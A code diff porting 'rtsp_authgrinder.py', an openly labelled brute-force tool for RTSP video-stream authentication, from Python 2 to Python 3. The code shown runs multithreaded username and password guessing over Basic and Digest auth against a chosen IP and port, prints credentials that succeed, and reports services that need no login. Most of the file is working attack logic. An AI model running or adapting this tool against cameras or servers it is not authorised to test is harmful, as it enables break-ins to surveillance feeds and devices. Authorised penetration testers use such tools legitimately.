@@ -105,7 +105,7 @@ def create_test_packet():
     return create_core_packet() + "\r\n"
 	
 def create_basic_packet(user, password):
-    ecreds = base64.b64encode(user + ":" + password)
+    ecreds = str(base64.b64encode(bytes(user + ":" + password, encoding='ascii')))
     setup_pkt = create_core_packet()
     setup_pkt += 'Authorization: Basic ' + ecreds + '\r\n\r\n'
     return setup_pkt
@@ -200,14 +200,14 @@ class AuthThreader(threading.Thread):
     			password = pair[1]
     			#print "doing pair " + user + "," + password
     			pkt = self.creator(user, password)
-    			s.sendall(pkt)
+    			s.sendall(bytes(pkt, encoding='ascii'))
     			#print 'Packet: ' + pkt
     			#print 'Packet sent'
     			inputready, outputready, exceptready = select.select([s], [], [], 5)
-    			data = s.recv(1024)
+    			data = str(s.recv(1024))
     			#print data
     			if is_Authorized(data):
-    				print "Found one"
+    				print("Found one")
     				pstr = "======================= Possible Success =========================\n"
     				pstr += "User name: " + user + "\n"
     				pstr += "Password: " + password + "\n"
@@ -218,18 +218,18 @@ class AuthThreader(threading.Thread):
     					self.workingList.addFound(pstr)
     				finally:
     					self.lock.release()
-    	except KeyboardInterrupt, ki:
-    		print "The run was interrupted by the user pressing Ctl-C"
+    	except KeyboardInterrupt as ki:
+    		print("The run was interrupted by the user pressing Ctl-C")
     		raise KeyboardInterrupt(ki)
-    	except socket.timeout, e:
-    		print "The connection timed out trying to reach the IP provided."
-    		print e
-    	except socket.error, e:
-    		print "There is an error encountered in the network communication"
-    		print e
-    	except Exception, e:
-    		print "There was some error thrown not sure what..."
-    		print e
+    	except socket.timeout as e:
+    		print("The connection timed out trying to reach the IP provided.")
+    		print(e)
+    	except socket.error as e:
+    		print("There is an error encountered in the network communication")
+    		print(e)
+    	except Exception as e:
+    		print("There was some error thrown not sure what...")
+    		print(e)
         	
 def checkForFoundAndPrint(lock, list):
 	try:
@@ -238,7 +238,7 @@ def checkForFoundAndPrint(lock, list):
 		if list.hasFound():
 			#print "has found..."
 			for s in list.getAllFoundAndClear():
-				print s
+				print(s)
 	finally:
 		lock.release()
 	
@@ -248,16 +248,16 @@ def test_auth_and_run():
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(5)
 		s.connect((IP, PORT))
-		s.sendall(pkt)
+		s.sendall(bytes(pkt, encoding='ascii'))
 		data = s.recv(1024)
 	except KeyboardInterrupt :
-		print "The run was interrupted by the user pressing Ctl-C"
+		print("The run was interrupted by the user pressing Ctl-C")
 		return
 	except socket.timeout :
-		print "The test timed out trying to reach the IP provided. Check your IP and network and try again"
+		print("The test timed out trying to reach the IP provided. Check your IP and network and try again")
 		return
 	except socket.error :
-		print "There is a networking problem. Please check your network and try again"
+		print("There is a networking problem. Please check your network and try again")
 		return
 	rstr = repr(data)
 	found = False
@@ -268,7 +268,7 @@ def test_auth_and_run():
 				masterList.append((user, password))
 		if use_Basic_Auth(rstr):
 			workingList = masterList[:]
-			print "Basic Auth is supported and starting run with Basic Auth..."
+			print("Basic Auth is supported and starting run with Basic Auth...")
 			creator = create_basic_packet
 			runners = []
 			lock = threading.Lock()
@@ -317,15 +317,15 @@ def test_auth_and_run():
 						break
 				checkForFoundAndPrint(lock, workQueue)
 			except KeyboardInterrupt :
-				print "The run was interrupted by the user pressing Ctl-C"
+				print("The run was interrupted by the user pressing Ctl-C")
 				sys.exit(0)
 			except socket.timeout :
-				print "The test timed out trying to reach the IP provided. Check your IP and network and try again"
+				print("The test timed out trying to reach the IP provided. Check your IP and network and try again")
 			except socket.error :
-				print "There is a networking problem. Please check your network and try again"
-			except Exception, e :
-				print "There is some other exception being thrown"
-				print repr(e)
+				print("There is a networking problem. Please check your network and try again")
+			except Exception as e :
+				print("There is some other exception being thrown")
+				print(repr(e))
 			finally:
 				for runner in runners:
 					runner.forceDone()
@@ -333,25 +333,25 @@ def test_auth_and_run():
 				#print "Check found in second finally"
 				checkForFoundAndPrint(lock, workQueue)
 				return
-			print "End of run with Basic Auth..."
+			print("End of run with Basic Auth...")
 		elif use_Digest_Auth(rstr) and not found:
-			print "Digest Auth is supported and starting run with Digest Auth..."
+			print("Digest Auth is supported and starting run with Digest Auth...")
 			creator = create_digest_packet
 			for user in users:
 				for password in passwords:
 					perform_rtsp_auth(user, password, creator)
-			print "End of run with Digest Auth..."
+			print("End of run with Digest Auth...")
 	else:
-		print "The RTSP service at: " + IP + ":" + PORT + " allows unauthorized access and does not need a username/password"
+		print("The RTSP service at: " + IP + ":" + PORT + " allows unauthorized access and does not need a username/password")
 
 
 if __name__ == '__main__':
-	print "\n\n     rtsp_authgrinder.py - Brute forcing tool for RTSP Protocol"
-	print "   Copyright (C) 2014 Luke Stephens and Tek Security Group, LLC"
-	print "   This program comes with ABSOLUTELY NO WARRANTY. This is free software, and"
-	print "   you are welcome to use and redistribute it under certain conditions. See"
-	print "   the license file provided with the distribution,"
-	print "   or https://github.com/tektengu/rtsp_authgrinder/license.txt\n\n"
+	print("\n\n     rtsp_authgrinder.py - Brute forcing tool for RTSP Protocol")
+	print("   Copyright (C) 2014 Luke Stephens and Tek Security Group, LLC")
+	print("   This program comes with ABSOLUTELY NO WARRANTY. This is free software, and")
+	print("   you are welcome to use and redistribute it under certain conditions. See")
+	print("   the license file provided with the distribution,")
+	print("   or https://github.com/tektengu/rtsp_authgrinder/license.txt\n\n")
 	parser = OptionParser()
 	parser.add_option('-l', dest='user',
 						help='single user name to authenticate with', metavar='USER')
@@ -390,11 +390,11 @@ if __name__ == '__main__':
 		passwords.append(options.password)
 	if options.password_file:
 		passwords = read_in_passwords(options.password_file)
-	print "********************************************************************************"
-	print "Starting RTSP Auth Grinder on IP: " + IP + " and PORT: " + str(PORT)
-	print "Running with %d threads" % THREADS
-	print "There are %s user names to test" % str(len(users))
-	print "There are %s passwords to test" % str(len(passwords))
-	print "Total combinations to test are " + str(len(users) * len(passwords))
-	print "********************************************************************************"
+	print("********************************************************************************")
+	print("Starting RTSP Auth Grinder on IP: " + IP + " and PORT: " + str(PORT))
+	print("Running with %d threads" % THREADS)
+	print("There are %s user names to test" % str(len(users)))
+	print("There are %s passwords to test" % str(len(passwords)))
+	print("Total combinations to test are " + str(len(users) * len(passwords)))
+	print("********************************************************************************")
 	test_auth_and_run()
